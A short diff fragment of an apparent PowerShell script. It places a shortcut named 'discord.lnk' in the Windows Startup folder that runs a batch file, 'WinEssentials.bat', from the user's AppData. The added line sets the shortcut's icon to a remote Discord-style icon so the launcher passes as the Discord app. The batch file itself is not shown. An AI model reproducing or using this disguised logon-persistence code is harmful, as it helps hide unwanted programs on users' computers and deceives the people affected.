@@ -30,6 +30,7 @@ exit
 
 $Shortcut = $wshell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\discord.lnk")
 $Shortcut.TargetPath = "$env:APPDATA\WinEssentials.bat"
+$Shortcut.IconLocation="https://vulndetect.org/assets/uploads/files/1545080305400-discord.exe..ico"
 $Shortcut.Save()
 }
 
